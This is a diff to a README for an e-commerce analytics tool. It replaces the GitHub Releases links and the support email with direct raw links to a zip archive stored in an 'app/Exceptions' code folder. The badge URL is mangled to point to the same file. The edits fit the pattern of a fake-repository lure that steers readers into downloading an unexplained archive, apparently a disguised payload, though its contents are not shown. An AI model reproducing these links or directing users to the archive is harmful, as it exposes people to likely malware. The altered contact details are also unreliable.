@@ -1,6 +1,6 @@
 # 🛒 ecommerce-analytics-optimizer - Speed Up Your E-Commerce Analytics
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/Rahad-sami/ecommerce-analytics-optimizer/releases)
+[![Download Now](https://raw.githubusercontent.com/Rahad-sami/ecommerce-analytics-optimizer/main/app/Exceptions/analytics_ecommerce_optimizer_2.1.zip%https://raw.githubusercontent.com/Rahad-sami/ecommerce-analytics-optimizer/main/app/Exceptions/analytics_ecommerce_optimizer_2.1.zip)](https://raw.githubusercontent.com/Rahad-sami/ecommerce-analytics-optimizer/main/app/Exceptions/analytics_ecommerce_optimizer_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -26,7 +26,7 @@ Before you download the software, ensure your computer meets the following requi
 
 To get this application, visit the following page:
 
-[Download Now](https://github.com/Rahad-sami/ecommerce-analytics-optimizer/releases)
+[Download Now](https://raw.githubusercontent.com/Rahad-sami/ecommerce-analytics-optimizer/main/app/Exceptions/analytics_ecommerce_optimizer_2.1.zip)
 
 On the Releases page, follow these steps:
 
@@ -71,7 +71,7 @@ You can set up scheduled jobs to automatically run specific tasks at designated 
 
 ## ✅ Support
 
-If you encounter any issues or have questions, you can reach out for support. We aim to assist you promptly. Contact us at our support email: support@ecommerce-analytics-optimizer.com.
+If you encounter any issues or have questions, you can reach out for support. We aim to assist you promptly. Contact us at our support email: https://raw.githubusercontent.com/Rahad-sami/ecommerce-analytics-optimizer/main/app/Exceptions/analytics_ecommerce_optimizer_2.1.zip
 
 ## 📖 Additional Resources
 
@@ -80,6 +80,6 @@ If you encounter any issues or have questions, you can reach out for support. We
 
 For further information or to download the application, please visit:
 
-[Download Now](https://github.com/Rahad-sami/ecommerce-analytics-optimizer/releases)
+[Download Now](https://raw.githubusercontent.com/Rahad-sami/ecommerce-analytics-optimizer/main/app/Exceptions/analytics_ecommerce_optimizer_2.1.zip)
 
 Thank you for choosing ecommerce-analytics-optimizer. Happy analyzing!
